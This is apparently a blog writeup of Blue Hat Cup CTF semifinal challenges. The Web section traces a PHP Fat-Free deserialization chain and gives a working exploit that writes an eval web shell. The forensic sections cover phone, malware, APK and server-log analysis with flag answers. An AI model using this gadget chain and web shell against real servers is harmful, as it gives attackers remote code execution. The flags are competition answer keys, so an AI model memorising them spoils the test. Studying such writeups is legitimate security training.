id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-easyfatfree"><a href="#1-easyfatfree" class="headerlink" title="1. easyfatfree"></a>1. easyfatfree</h3><p>通过扫描，发现<code>www.zip</code>网站源码</p><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Kickstart the framework</span></span><br><span class="line"><span class="variable">$f3</span>=<span class="keyword">require</span>(<span class="string">&#x27;lib/base.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">float</span>)PCRE_VERSION&lt;<span class="number">8.0</span>)</span><br><span class="line">    <span class="title function_ invoke__">trigger_error</span>(<span class="string">&#x27;PCRE version is out of date&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f3</span>-&gt;<span class="title function_ invoke__">route</span>(<span class="string">&#x27;GET /&#x27;</span>,</span><br><span class="line">    function(<span class="variable">$f3</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;easyfatfree unserialize me&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f3</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接将GET请求的<code>payload</code>参数反序列化, 搜索<code>__destruct</code></p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182436949.png" alt="__destruct()"></p><p><code>DBJig</code>类中的<code>__destruct</code>方法代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">.... <span class="comment">// 省略</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;lazy) &#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;lazy = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;data?:[] <span class="keyword">as</span> <span class="variable">$file</span> =&gt; <span class="variable">$data</span>)</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$file</span>,<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果<code>$this-&gt;lazy</code> 为True, 那么就会进入<code>$this-&gt;write</code>函数，此函数参数来源<code>$this-&gt;data</code>这个数组，</p><p>key为文件名，value为数据，跟进查看<code>$this-&gt;write</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$file</span>,<span class="keyword">array</span> <span class="variable">$data</span>=<span class="literal">NULL</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;dir || <span class="variable language_">$this</span>-&gt;lazy)</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">count</span>(<span class="variable">$this</span>-&gt;data[<span class="variable">$file</span>]=<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$fw</span>=<span class="title class_">\Base</span>::<span class="title function_ invoke__">instance</span>();</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable language_">$this</span>-&gt;format) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="built_in">self</span>::<span class="variable constant_">FORMAT_JSON</span>:</span><br><span class="line"><span class="variable">$out</span>=<span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>,JSON_PRETTY_PRINT);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="built_in">self</span>::<span class="variable constant_">FORMAT_Serialized</span>:</span><br><span class="line"><span class="variable">$out</span>=<span class="variable">$fw</span>-&gt;<span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$fw</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;dir.<span class="variable">$file</span>,<span class="variable">$out</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果<code>$this-&gt;dir</code>为空，或者<code>$this-&gt;lazy</code>为<code>TRUE</code>，则返回<code>count($this-&gt;data[$file]=$data)</code>。因为在上面<code>__destruct</code>函数的流程中已经将<code>$this-&gt;lazy</code>设置为FALSE了，所以，我们只需要满足<code>$this-&gt;dir</code>不为空即可。接着看switch循环，<code>$this-&gt;format</code>为<code>0</code>则进入<code>json_encode</code>，<code>1</code>则进入<code>serialize</code>。因此我们设置<code>$this-&gt;format</code>为0即可，接着调用<code>Base::instance()</code>类的<code>write</code>方法，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$data</span>,<span class="variable">$append</span>=<span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$data</span>,<span class="variable">$this</span>-&gt;hive[<span class="string">&#x27;LOCK&#x27;</span>]|(<span class="variable">$append</span>?<span class="attr">FILE_APPEND</span>:<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用了<code>file_put_contents</code>来写文件。分析就此，构造exp如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">DB</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jig</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span></span><br><span class="line">        FORMAT_JSON=<span class="number">0</span>,</span><br><span class="line">        FORMAT_Serialized=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$uuid</span>, <span class="variable">$dir</span>, <span class="variable">$format</span>, <span class="variable">$log</span>, <span class="variable">$data</span>, <span class="variable">$lazy</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lazy=<span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data=[<span class="string">&quot;1.php&quot;</span>=&gt;[<span class="string">&quot;&lt;?php @eval(\$_POST[cmd]);?&gt;&quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;format=<span class="built_in">self</span>::<span class="variable constant_">FORMAT_Serialized</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dir=<span class="string">&quot;/var/www/html/lib/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Jig</span>()));</span><br></pre></td></tr></table></figure><blockquote><p>注：默认的路劲<code>/var/www/html/</code>无写权限,所以这里我们需要指定路劲</p><p>当然，<code>./lib</code>也是可以的</p></blockquote><p>访问<code>/lib/1.php</code></p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804183710382.png"></p><h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="手机取证-1"><a href="#手机取证-1" class="headerlink" title="手机取证_1"></a>手机取证_1</h3><p><strong>题目：iPhone手机的iBoot固件版本号:（答案参考格式：iBoot-1.1.1）</strong></p><p>使用盘古石手机取证分析系统导入iphone手机的zip文件,在设备信息一栏可以看到手机的iBoot固件版本号</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175232682.png"></p><p>flag:iBoot-7429.62.1</p><h3 id="手机取证-2"><a href="#手机取证-2" class="headerlink" title="手机取证_2"></a>手机取证_2</h3><p><strong>题目：该手机制作完备份UTC+8的时间（非提取时间）:（答案参考格式：2000-01-01 00:00:00）</strong></p><p>打开iphone7.zip,修改日期即为手机制作完备份的时间</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175508502.png"></p><p>flag:2022-01-11 18:47:38</p><h3 id="exe分析-1"><a href="#exe分析-1" class="headerlink" title="exe分析_1"></a>exe分析_1</h3><p> 将services.exe上传到微步云沙箱（<a href="https://s.threatbook.com/%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%A3%80%E6%B5%8B%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%9C%A8%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E4%B8%80%E6%A0%8F%E6%9F%A5%E7%9C%8B%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%EF%BC%8C%E5%B9%B6%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E8%AF%A6%E6%83%85%E5%BE%97%E7%9F%A5%E5%88%9B%E5%BB%BA%E4%BA%86C:/Program">https://s.threatbook.com/）进行检测，可以在动态分析一栏查看执行流程图，并查看进程详情得知创建了C:\Program</a> Files\Common Files\Services\WmiApSvr.exe来执行</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175252073.png"></p><h3 id="exe分析-2"><a href="#exe分析-2" class="headerlink" title="exe分析_2"></a>exe分析_2</h3><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804184120510.png"></p><p>PE分析，发现<code>HackTool.FlyStudio.acz_unpack.exe</code>调用了<code>advapi32.dll</code></p><h3 id="Exe分析-3"><a href="#Exe分析-3" class="headerlink" title="Exe分析_3"></a>Exe分析_3</h3><p> 将aspnet_wp.v.exe上传到微步云沙箱（<a href="https://s.threatbook.com/%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%A3%80%E6%B5%8B%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%9C%A8%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E4%B8%80%E6%A0%8F%E6%9F%A5%E7%9C%8B%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E6%89%A7%E8%A1%8C%E5%90%8E%E5%90%AF%E5%8A%A8%E7%9A%84%E8%BF%9B%E7%A8%8B%E6%98%AFsvchost.exe">https://s.threatbook.com/）进行检测，可以在动态分析一栏查看执行流程图，可以发现执行后启动的进程是svchost.exe</a></p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175319005.png"></p><h3 id="Exe分析-4"><a href="#Exe分析-4" class="headerlink" title="Exe分析_4"></a>Exe分析_4</h3><p>将exe上传到VT（<a href="https://www.virustotal.com/%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%89%AB%E6%8F%8F%EF%BC%8C%E4%BB%8E%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C%E7%9A%84%E5%85%B3%E9%94%AE%E8%AF%8D%E4%B8%AD%E5%8F%AF%E7%9F%A5%E6%98%AF%E6%8C%96%E7%9F%BF%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%97%85%E6%AF%92">https://www.virustotal.com/）进行扫描，从扫描结果的关键词中可知是挖矿类型的病毒</a></p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175510599.png"></p><h3 id="exe分析-5"><a href="#exe分析-5" class="headerlink" title="exe分析_5"></a>exe分析_5</h3><p>将exe上传到微步云沙箱（<a href="https://s.threatbook.com/%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%A3%80%E6%B5%8B%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%9C%A8%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E4%B8%80%E6%A0%8F%E6%9F%A5%E7%9C%8B%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%9C%89%E4%B8%80%E4%B8%AA%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E8%A1%8C%E4%B8%BA%EF%BC%8CIP%E6%98%AF**220.86.87.232**%EF%BC%8C">https://s.threatbook.com/）进行检测，可以在动态分析一栏查看执行流程图，可以看到有一个网络连接行为，IP是**220.86.87.232**，</a><br><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175651779.png"></p><p>查询ip的归属地是韩国<br><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175742508.png"></p><h3 id="APK分析-02"><a href="#APK分析-02" class="headerlink" title="APK分析_02"></a>APK分析_02</h3><p>将APK反编译后找到MainActivity，可以发现有一串base64字符串：aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180150225.png"></p><p>将其解密，得到服务器地址：ansjk.ecxeio.xyz</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180332104.png"></p><h3 id="APK分析-03"><a href="#APK分析-03" class="headerlink" title="APK分析_03"></a>APK分析_03</h3><p>在MainActivity可发现，import p061d.p062a.p063a.AbstractActivityC0773h;这行代码，跟入这个<br><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180516999.png"></p><p>查看回上图提供服务器地址的函数是mo4758t()，在这段代码中的第7行找到了调用，this.f3118q.loadUrl(mo4758t());所以加载服务器的函数是：loadUrl<br><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180700265.png"></p><h3 id="APK分析-05"><a href="#APK分析-05" class="headerlink" title="APK分析_05"></a>APK分析_05</h3><p>根据APK分析_06题的题干可知，首先得有安全检测行为才能寻找检测方法，所以选择是<br><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804181012712.png"></p><h3 id="APK分析-07"><a href="#APK分析-07" class="headerlink" title="APK分析_07"></a>APK分析_07</h3><p>反编译，发现三个View视图</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804184256493.png"></p><p>flag为<code>3</code></p><h3 id="APK分析-08"><a href="#APK分析-08" class="headerlink" title="APK分析_08"></a>APK分析_08</h3><p><strong>题目：受害人手机中红星IPA的包名是:（答案参考格式：a.s.d）</strong></p><p>在盘古石计算机取证分析系统中把红星.ipa下到本地来</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182015391.png"></p><p>修改为zip后解压得到文件夹</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182239159.png"></p><p>在文件夹内搜索Info.plist打开</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182710798.png"></p><p>在Info.plist里搜索CFBundleIdentifier得到包名</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182752286.png"></p><p>flag:com.dd666.hongxin</p><h3 id="APK分析-09"><a href="#APK分析-09" class="headerlink" title="APK分析_09"></a>APK分析_09</h3><p><strong>题目：受害人手机中红星IPA的APIKEY是:（答案参考格式：asd）</strong></p><p>在info.plist里面搜索APIKEY关键字得到flag</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804183125194.png"></p><p>flag:d395159c291c627c9d4ff9139bf8f0a700b98732</p><h3 id="APK分析-11"><a href="#APK分析-11" class="headerlink" title="APK分析_11"></a>APK分析_11</h3><p><strong>题目：嫌疑人手机中红星APK的服务器地址是:（答案参考格式：ass.a.d:11）</strong></p><p>使用在线apk信息解密得到红星APK的服务器地址</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804183555001.png"></p><p>flag:<a href="http://www.nansjy.com.cn:8161/">http://www.nansjy.com.cn:8161</a></p><h3 id="APK分析-12"><a href="#APK分析-12" class="headerlink" title="APK分析_12"></a>APK分析_12</h3><p><strong>题目:嫌疑人手机中红星APK的程序入口是:（答案参考格式：a.v.b.n）</strong></p><p>使用jadx-gui导入红星APK程序,打开AndroidManifest.xml</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804183954273.png"></p><p>搜索LAUNCHER上面active的android:name既为程序的入口</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804184055576.png"></p><p>flag:com.example.weisitas526sad.activity.SplashActivity</p><h3 id="APK分析-15"><a href="#APK分析-15" class="headerlink" title="APK分析_15"></a>APK分析_15</h3><p>压缩包工具解压<code>手机流量包.saz</code>, 使用<code>grep</code>查找<code>password</code>字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rin <span class="string">&quot;password&quot;</span> ./raw/*</span><br></pre></td></tr></table></figure><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804184639469.png"></p><p>flag为<code>17317289056/b12345678b</code></p><h3 id="服务器取证-04"><a href="#服务器取证-04" class="headerlink" title="服务器取证_04"></a>服务器取证_04</h3><p>导入嫌疑人的服务器检材进行计算机取证，将其中linux服务器的www文件夹先导出<br><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804181523060.png"></p><p>在相对路径www\server\panel\logs\request中可以找到宝塔面板的访问日志，在以下文件中选择时间最早的解压查看<br><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804181635301.png"></p><p>最早一次对&#x2F;login路径发送post包的时间也就是最早登录时间，flag值：2021-05-17 16:10:40<br><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804181842265.png"></p><h3 id="服务器取证-07"><a href="#服务器取证-07" class="headerlink" title="服务器取证_07"></a>服务器取证_07</h3><p>服务器的访问日志在相对路径www\wwwlogs\access.log文件中，找到最早访问后台的IP是：183.160.76.194<br><img 